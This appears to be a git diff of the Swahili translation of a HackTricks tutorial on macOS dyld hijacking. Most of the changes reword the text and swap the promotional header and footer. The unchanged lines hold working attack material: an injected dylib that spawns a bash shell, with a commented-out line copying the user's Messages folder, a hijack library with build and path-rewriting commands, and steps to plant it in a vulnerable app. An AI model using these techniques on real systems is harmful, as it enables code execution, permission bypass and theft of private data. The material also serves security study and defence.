@@ -1,22 +1,23 @@
-# macOS Udukuzi wa Dyld & DYLD_INSERT_LIBRARIES
+# macOS Dyld Hijacking & DYLD\_INSERT\_LIBRARIES
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Mfano wa Msingi wa DYLD_INSERT_LIBRARIES
+## DYLD\_INSERT\_LIBRARIES Mfano wa msingi
 
-**Mfano wa maktaba ya kuingiza** ili kutekeleza kikao cha amri:
+**Maktaba ya kuingiza** ili kutekeleza shell:
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -34,7 +35,7 @@ execv("/bin/bash", 0);
 //system("cp -r ~/Library/Messages/ /tmp/Messages/");
 }
 ```
-Binaryi ya kushambulia:
+Binary ya kushambulia:
 ```c
 // gcc hello.c -o hello
 #include <stdio.h>
@@ -45,13 +46,13 @@ printf("Hello, World!\n");
 return 0;
 }
 ```
-Uingizaji:
+Uwekaji:
 ```bash
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
 ## Mfano wa Dyld Hijacking
 
-Binary inayolengwa na mdudu ni `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
+Binary iliyoathirika ni `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
 
 {% tabs %}
 {% tab title="entitlements" %}
@@ -91,7 +92,7 @@ compatibility version 1.0.0
 {% endtab %}
 {% endtabs %}
 
-Kwa habari tulizopata hapo awali tunajua kwamba **haichunguzi saini ya maktaba zilizopakia** na inajaribu kupakia maktaba kutoka:
+Kwa taarifa zilizopita, tunajua kwamba **haichunguzi saini ya maktaba zilizoloadiwa** na **inajaribu kupakia maktaba kutoka**:
 
 * `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 * `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
@@ -104,7 +105,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-Basi, niwezekanavyo kuiteka! Unda maktaba ambayo **inatekeleza nambari isiyojulikana na kuuza kazi sawa** kama maktaba halali kwa kuuza upya. Na kumbuka kuikusanya na toleo lililotarajiwa:
+Hivyo, inawezekana kuiteka! Unda maktaba ambayo **inasimamia baadhi ya msimbo wa kiholela na inatoa kazi sawa** kama maktaba halali kwa kuirejesha. Na kumbuka kuikamilisha na toleo zinazotarajiwa:
 
 {% code title="lib.m" %}
 ```objectivec
@@ -117,7 +118,7 @@ NSLog(@"[+] dylib hijacked in %s", argv[0]);
 ```
 {% endcode %}
 
-Icompile:
+Ili kuikamilisha:
 
 {% code overflow="wrap" %}
 ```bash
@@ -126,7 +127,7 @@ gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Found
 ```
 {% endcode %}
 
-Njia ya kuuza upya iliyoundwa katika maktaba ni ya kulinganisha na mzigo, hebu ibadilishe kwa njia ya moja kwa moja kwa njia ya maktaba ya kuuza upya:
+Njia ya reexport iliyoundwa katika maktaba ni ya kuhusiana na loader, hebu tuibadilishe kuwa njia kamili kwa maktaba ya kusafirisha:
 
 {% code overflow="wrap" %}
 ```bash
@@ -147,7 +148,7 @@ name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Con
 ```
 {% endcode %}
 
-Hatimaye nakili kwenye **eneo lililodukuliwa**:
+Hatimaye nakala tu kwenye **mahali palipoharibiwa**:
 
 {% code overflow="wrap" %}
 ```bash
@@ -155,33 +156,34 @@ cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
 {% endcode %}
 
-Na **tekeleza** faili ya binary na angalia **maktaba ilipakia**:
+Na **tekeleza** binary na uangalie **maktaba ilipakiwa**:
 
 <pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
-<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib imechukuliwa katika /Applications/VulnDyld.app/Contents/Resources/lib/binary
+<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
 </strong>Matumizi: [...]
 </code></pre>
 
 {% hint style="info" %}
-Maelezo mazuri kuhusu jinsi ya kutumia udhaifu huu kudhibiti ruhusa za kamera za telegram yanaweza kupatikana katika [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
+Andiko zuri kuhusu jinsi ya kutumia udhaifu huu kuathiri ruhusa za kamera za telegram linaweza kupatikana katika [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
 {% endhint %}
 
-## Kwa Kiwango Kubwa
+## Kiwango Kikubwa
 
-Ikiwa unapanga kujaribu kuingiza maktaba katika faili za binary ambazo hazikutazamiwa, unaweza kuangalia ujumbe wa tukio ili kujua wakati maktaba inapakia ndani ya mchakato (katika kesi hii ondoa printf na utekelezaji wa `/bin/bash`).
+Ikiwa unapanga kujaribu kuingiza maktaba katika binaries zisizotarajiwa unaweza kuangalia ujumbe wa matukio ili kujua wakati maktaba inapopakuliwa ndani ya mchakato (katika kesi hii ondoa printf na utekelezaji wa `/bin/bash`).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
